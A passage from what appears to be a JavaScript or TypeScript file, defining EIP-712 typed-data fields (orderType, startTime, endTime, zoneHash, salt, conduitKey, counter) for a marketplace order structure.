                type: 'ConsiderationItem[]'
            },
            {
                name: 'orderType',
                type: 'uint8'
            },
            {
                name: 'startTime',
                type: 'uint256'
            },
            {
                name: 'endTime',
                type: 'uint256'
            },
            {
                name: 'zoneHash',
                type: 'bytes32'
            },
            {
                name: 'salt',
                type: 'uint256'
            },
            {
                name: 'conduitKey',
                type: 'bytes32'
            },
            {
                name: 'counter',
                type: 'uint256'
            },
        ],
    },
};